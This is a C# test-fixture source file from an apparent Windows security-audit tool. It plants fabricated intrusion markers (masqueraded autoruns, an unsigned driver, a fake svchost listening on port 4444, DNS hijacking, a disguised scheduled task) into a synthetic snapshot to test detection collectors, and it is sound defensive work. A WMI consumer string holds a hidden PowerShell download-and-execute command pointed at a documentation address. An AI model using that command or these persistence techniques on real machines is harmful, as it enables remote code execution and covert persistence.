using Rempart.Core.Providers;

namespace Rempart.Core.Snapshots;

/// <summary>
/// The signs of an intrusion, planted into a synthetic snapshot so that the finding
/// collectors have something to judge.
///
/// <para>
/// Exists because every versioned fixture was clean (DET-DIRTY). The three of them vary
/// the <b>configuration</b> the rules read — hardened, Windows defaults, access denied —
/// and none carries a single thing to find. The threat paths were therefore exercised
/// only by fakes, one collector at a time: the console rendering, the JSON report and the
/// comparison had never seen a suspicious finding, and their references froze "nothing
/// found" — the reassuring shape a broken scan also has.
/// </para>
///
/// <para>
/// The threat material is fabricated, and deliberately so: RFC 5737 addresses, digests of
/// repeated <c>deadbeef</c>, a pre-hashed account segment. Nothing here is a real
/// indicator of compromise that someone could mistake for one.
/// </para>
///
/// <para>
/// What that claim does <b>not</b> cover, stated here rather than left to be discovered.
/// Of the seven surfaces this file plants into, four are written onto data
/// <see cref="SyntheticSnapshot"/> copies from the source capture — autoruns onto the
/// registry, the subscription onto WMI, and the task onto a scheduled-task list that keeps
/// its couple of hundred real entries. A synthetic fixture is a real capture with its
/// identifying fields scrubbed, not a machine invented from nothing.
/// </para>
///
/// <para>
/// What that used to leave behind was an identity: product names in task paths, a mainboard
/// model, a BIOS date. It is gone — <see cref="SyntheticSnapshot.Build"/> now runs
/// <see cref="Anonymiser"/> over its own output instead of merely declaring the result
/// anonymised, and the anonymiser reaches those fields (DET-FIXTURE-MATERIEL).
/// <c>Versioned_fixtures_are_anonymised</c> fails if any of it comes back.
/// </para>
///
/// <para>
/// What is still inherited is a <b>form</b>, and that is deliberate: a couple of hundred
/// scheduled tasks, the paths of the executables they launch, the several hundred verified
/// signatures. Those are the object of the audit — the report exists to name the binary
/// that runs — and a fixture where the only task is the malicious one would prove that the
/// collector reports, not that it picks the right line out of a crowd. The repository is
/// public, and a fixture named "compromised" is the last place to be vague about what is
/// real: the shape is real, the identity is not, and the threat material is fabricated.
/// </para>
///
/// <para>
/// The corpus is one coherent intrusion rather than a bag of isolated signals, and each
/// suspicious item is paired with a benign counterpart the collector must <b>not</b>
/// flag. A fixture on which everything is suspicious proves that the collector alerts,
/// not that it discriminates — and it is the discrimination that decides whether the
/// report gets read.
/// </para>
/// </summary>
public static class CompromiseMarkers
{
    /// <summary>
    /// Account segment, in the shape <see cref="Anonymiser"/> leaves behind. Written
    /// pre-hashed rather than as a name, and no longer as a precaution: the markers are
    /// planted before <see cref="Anonymiser.Apply"/> runs, so a plain first name here
    /// would come out as a digest and the fixture would stop matching its own references.
    /// <see cref="Anonymiser.Hash"/> being idempotent, this value crosses that pass
    /// untouched.
    /// </summary>
    private const string Account = "anon:1a2b3c4d5e6f";

    private const string TempFolder = $@"C:\Users\{Account}\AppData\Local\Temp";

    /// <summary>
    /// Documentation address (RFC 5737, TEST-NET-2). No such host can exist, so the
    /// fixture names a command-and-control server without naming anyone's machine — and
    /// nobody rereading this file later has to check whether the address was real.
    /// </summary>
    private const string ControlServer = "198.51.100.23";

    /// <summary>
    /// Fingerprints that cannot be mistaken for indicators of compromise. A plausible
    /// hex string here would eventually be copied out of the fixture and searched for as
    /// if it identified a file; <c>deadbeef</c> repeated says what it is. It also cannot
    /// collide with the driver blocklist, whose shipped baseline is empty anyway.
    /// </summary>
    private const string FabricatedHash =
        "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef";

    private const string MicrosoftPublisher = "CN=Microsoft Windows, O=Microsoft Corporation";

    /// <summary>
    /// Writes the markers into <paramref name="snapshot"/>.
    ///
    /// <para>
    /// Called last, after the rule substitution and after any <c>--deny</c>: the markers
    /// are the whole point of this fixture, and a path fragment denied for unrelated
    /// reasons must not quietly remove one. A capture that claims to be compromised and
    /// replays clean is worse than no fixture at all.
    /// </para>
    /// </summary>
    public static void PlantInto(MachineSnapshot snapshot)
    {
        PlantAutoruns(snapshot);
        PlantDrivers(snapshot);
        PlantProcessesAndPorts(snapshot);
        PlantWmiSubscription(snapshot);
        PlantDns(snapshot);
        PlantBrowserExtensions(snapshot);
        PlantScheduledTask(snapshot);
    }

    /// <summary>
    /// Two <c>Run</c> entries, one of each verdict.
    ///
    /// <para>
    /// The suspicious one is named <c>OneDriveSync</c> and launches from the user's
    /// temporary folder: the name is Microsoft's, the origin is nobody's. That is the
    /// exact claim <see cref="Findings.SignatureLadder"/> makes in its own summary — the
    /// judgement rests on the signature, not on the name or the path — and until now no
    /// fixture put it to the test end to end.
    /// </para>
    ///
    /// <para>
    /// The names are written into <see cref="MachineSnapshot.RegistryLists"/> as well as
    /// into <see cref="MachineSnapshot.Registry"/>. A replay enumerates the first and
    /// reads the second; writing only the values would leave the collector with nothing
    /// to enumerate, and the fixture would look clean for a purely mechanical reason.
    /// </para>
    /// </summary>
    private static void PlantAutoruns(MachineSnapshot snapshot)
    {
        const string MachineRun = @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        const string UserRun = @"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        const string Legitimate = @"C:\Windows\System32\SecurityHealthSystray.exe";
        const string Dropped = $@"{TempFolder}\OneDriveSync.exe";

        Enumerated(snapshot, MachineRun, "SecurityHealth", Legitimate);
        Enumerated(snapshot, UserRun, "OneDriveSync", Dropped);

        snapshot.Signatures[Legitimate] =
            new FileSignature(SignatureStatus.Valid, MicrosoftPublisher, $"{FabricatedHash}00000001");
        snapshot.Signatures[Dropped] =
            new FileSignature(SignatureStatus.Unsigned, null, $"{FabricatedHash}00000002");
    }

    /// <summary>
    /// An unsigned driver loaded in the kernel, beside a signed system one.
    ///
    /// <para>
    /// The status is written alongside the list: a snapshot carrying drivers but no
    /// status replays as a success, and one carrying neither replays as "could not look".
    /// Only an explicit <see cref="ReadStatus.Found"/> makes the two drivers below an
    /// observation rather than a guess.
    /// </para>
    ///
    /// <para>
    /// The file name is invented on purpose. Naming a driver from the vulnerable-driver
    /// list would put a real product's name in a fixture called "compromised" without any
    /// verification behind it — and it would change nothing, since the blocklist a replay
    /// evaluates is empty.
    /// </para>
    /// </summary>
    private static void PlantDrivers(MachineSnapshot snapshot)
    {
        const string System = @"C:\Windows\System32\drivers\ntfs.sys";
        const string Dropped = @"C:\Windows\System32\drivers\syndrv64.sys";

        snapshot.Drivers =
        [
            new LoadedDriver("Ntfs", System),
            new LoadedDriver("syndrv64", Dropped),
        ];
        snapshot.DriversStatus = ReadStatus.Found;
        snapshot.DriversDiagnostic = null;

        snapshot.Signatures[System] =
            new FileSignature(SignatureStatus.Valid, MicrosoftPublisher, $"{FabricatedHash}00000003");
        snapshot.Signatures[Dropped] =
            new FileSignature(SignatureStatus.Unsigned, null, $"{FabricatedHash}00000004");
    }

    /// <summary>
    /// The implant, its two open ports, and the firewall that decides which of them is
    /// actually reachable.
    ///
    /// <para>
    /// Two processes share the name <c>svchost.exe</c> and get opposite verdicts, because
    /// only one of them is signed. Two ports are held by the same unsigned binary on
    /// <c>0.0.0.0</c> and get opposite verdicts too, because only one is allowed inbound
    /// on the Public profile. That second pair is the promise of the firewall cross-check:
    /// an open port the firewall blocks is not exposed the way an allowed one is, and
    /// nothing versioned had ever shown the two side by side.
    /// </para>
    /// </summary>
    private static void PlantProcessesAndPorts(MachineSnapshot snapshot)
    {
        const string SystemHost = @"C:\Windows\System32\svchost.exe";
        const string Implant = $@"{TempFolder}\svchost.exe";
        const int ImplantPid = 4712;

        snapshot.Processes =
        [
            new RunningProcess(1180, 892, "svchost.exe", SystemHost, CommandLine: ""),
            new RunningProcess(ImplantPid, 6104, "svchost.exe", Implant, CommandLine: ""),
        ];
        snapshot.ProcessesStatus = ReadStatus.Found;
        snapshot.ProcessesDiagnostic = null;

        snapshot.Signatures[SystemHost] =
            new FileSignature(SignatureStatus.Valid, MicrosoftPublisher, $"{FabricatedHash}00000005");
        snapshot.Signatures[Implant] =
            new FileSignature(SignatureStatus.Unsigned, null, $"{FabricatedHash}00000006");

        snapshot.ListeningPorts =
        [
            new ListeningPort("TCP", "0.0.0.0", 4444, ImplantPid),
            new ListeningPort("TCP", "0.0.0.0", 5555, ImplantPid),

            // Loopback, in the dynamic range, owner not in the process table: the two
            // exemptions a benign socket relies on. Left in so the references also freeze
            // what the collector stays quiet about.
            new ListeningPort("TCP", "127.0.0.1", 49669, 8321),
        ];
        snapshot.ListeningPortsStatus = ReadStatus.Found;
        snapshot.ListeningPortsDiagnostic = null;

        snapshot.Firewall = new FirewallState(
            Rules:
            [
                // The rule the intrusion adds for itself. Without it the port is open and
                // unreachable, which is precisely the distinction being frozen here.
                new FirewallRule(
                    Active: true, Direction: "In", Action: "Allow", Protocol: 6,
                    LocalPorts: "4444", Profiles: ["Public", "Private"], App: null),

                new FirewallRule(
                    Active: true, Direction: "In", Action: "Allow", Protocol: 6,
                    LocalPorts: "3389", Profiles: ["Domain"], App: null),
            ],
            PublicFirewallEnabled: true,
            PublicDefaultInboundAllow: false);
    }

    /// <summary>
    /// Fileless persistence: a consumer that runs a command line, and the filter that
    /// triggers it.
    ///
    /// <para>
    /// The built-in filter Windows ships with is kept beside the planted one. Without it
    /// the fixture would only show that an unknown filter is flagged, never that a known
    /// one is left alone — and a collector that flagged both would produce a line on
    /// every machine in the fleet, which is how a report stops being read.
    /// </para>
    /// </summary>
    private static void PlantWmiSubscription(MachineSnapshot snapshot)
    {
        const string Subscription = @"root\subscription";

        snapshot.Wmi[RecordingWmiProvider.Key(
            Subscription, "CommandLineEventConsumer",
            ["Name", "CommandLineTemplate", "ExecutablePath"])] = WmiRead.Found(
        [
            Instance(
                ("Name", "SystemUpdater"),
                ("CommandLineTemplate",
                    "powershell.exe -NoProfile -WindowStyle Hidden -Command "
                    + $"\"IEX (New-Object Net.WebClient).DownloadString('http://{ControlServer}/u')\""),
                ("ExecutablePath", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")),
        ]);

        snapshot.Wmi[RecordingWmiProvider.Key(
            Subscription, "ActiveScriptEventConsumer",
            ["Name", "ScriptFileName", "ScriptText"])] = WmiRead.NotFound;

        snapshot.Wmi[RecordingWmiProvider.Key(
            Subscription, "__EventFilter", ["Name", "Query"])] = WmiRead.Found(
        [
            Instance(
                ("Name", "SCM Event Log Filter"),
                ("Query", "select * from MSFT_SCMEventLogEvent")),

            Instance(
                ("Name", "SystemUpdaterFilter"),
                ("Query",
                    "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
                    + "TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'")),
        ]);
    }

    /// <summary>
    /// A static resolver nobody recognises, next to one handed out by DHCP.
    ///
    /// <para>
    /// The resolver is the control server itself: a machine whose name resolution goes
    /// through the intruder is the point of DNS hijacking, and reusing the address keeps
    /// the fixture one story instead of a list of unrelated oddities.
    /// </para>
    /// </summary>
    private static void PlantDns(MachineSnapshot snapshot) =>
        snapshot.Dns =
        [
            new DnsInterface("Ethernet", StaticServers: [ControlServer], DhcpServers: []),

            // 192.0.2.0/24 is TEST-NET-1: a plausible gateway that cannot be anybody's.
            new DnsInterface("Wi-Fi", StaticServers: [], DhcpServers: ["192.0.2.1"]),
        ];

    /// <summary>
    /// One sideloaded extension and one store extension with broad reach.
    ///
    /// <para>
    /// They exercise the two tiers the collector deliberately keeps apart: provenance
    /// decides the tier, permissions only refine it. A store install with
    /// <c>&lt;all_urls&gt;</c> and <c>nativeMessaging</c> describes an ordinary password
    /// manager, and ranking it with the sideload would flag half the fleet.
    /// </para>
    /// </summary>
    private static void PlantBrowserExtensions(MachineSnapshot snapshot)
    {
        snapshot.BrowserExtensions =
        [
            new BrowserExtension(
                Browser: "Chrome",
                Profile: "anon:7c1e05b4a930",
                Id: "hjklmnopqrstuvwxabcdefghijklmnop",
                Name: "Secure Browsing Helper",
                Version: "1.4.2",
                Permissions: ["tabs", "cookies", "webRequest", "nativeMessaging"],
                HostAccess: ["<all_urls>"],
                Enabled: true,
                FromStore: false),

            new BrowserExtension(
                Browser: "Chrome",
                Profile: "anon:7c1e05b4a930",
                Id: "abcdefghijklmnopqrstuvwxyzabcdef",
                Name: "Password Vault",
                Version: "3.11.0",
                Permissions: ["storage", "nativeMessaging"],
                HostAccess: ["<all_urls>"],
                Enabled: true,
                FromStore: true),
        ];

        snapshot.BrowserExtensionsStatus = ReadStatus.Found;
        snapshot.BrowserExtensionsDiagnostic = null;
    }

    /// <summary>
    /// A task that borrows Microsoft's folder, Microsoft's author and the system account,
    /// and launches an unsigned binary.
    ///
    /// <para>
    /// Appended to the tasks the source capture carried rather than replacing them: on the
    /// reference machine those are a couple of hundred benign entries, and a fixture where
    /// the only task is the malicious one would prove that the collector reports, not that
    /// it picks the right line out of a crowd. That crowd is the reason the report details
    /// what deserves review and merely counts the rest.
    /// </para>
    /// </summary>
    private static void PlantScheduledTask(MachineSnapshot snapshot)
    {
        const string Dropped = @"C:\ProgramData\SystemMaintenance\svcupdate.exe";

        var planted = new ScheduledTask(
            Path: @"\Microsoft\Windows\Maintenance\SystemMaintenance",
            Name: "SystemMaintenance",
            Enabled: true,
            State: "ready",
            Author: "Microsoft Corporation",
            UserId: "S-1-5-18",
            RunLevel: "HighestAvailable",
            Actions: [new TaskAction("exec", Dropped, "/silent")]);

        var existing = snapshot.ScheduledTasks;

        // Keyed on what the read carried rather than on its status: a walk refused in one
        // folder comes back as AccessDenied with its two hundred tasks, and testing the
        // status would drop that crowd on the floor — the crowd this fixture exists to make
        // the collector pick a line out of.
        snapshot.ScheduledTasks = existing is { Tasks.Count: > 0 }
            ? existing with { Tasks = [.. existing.Tasks, planted] }
            : ScheduledTaskRead.Found([planted]);

        snapshot.Signatures[Dropped] =
            new FileSignature(SignatureStatus.Unsigned, null, $"{FabricatedHash}00000007");
    }

    /// <summary>
    /// Records a value under a name a replay can enumerate. Both halves are needed:
    /// <see cref="MachineSnapshot.RegistryLists"/> says what is there,
    /// <see cref="MachineSnapshot.Registry"/> says what it holds.
    /// </summary>
    private static void Enumerated(
        MachineSnapshot snapshot, string keyPath, string valueName, string value)
    {
        if (!snapshot.RegistryLists.TryGetValue(keyPath, out var names))
        {
            names = [];
            snapshot.RegistryLists[keyPath] = names;
        }

        if (!names.Contains(valueName, StringComparer.OrdinalIgnoreCase))
        {
            names.Add(valueName);
        }

        snapshot.Registry[SnapshotKeys.Value(keyPath, valueName)] =
            RegistryRead.Found(RegistryValue.OfText(value));
    }

    private static WmiInstance Instance(params (string Name, string Value)[] properties) =>
        new(properties.ToDictionary(p => p.Name, p => p.Value, StringComparer.OrdinalIgnoreCase));
}
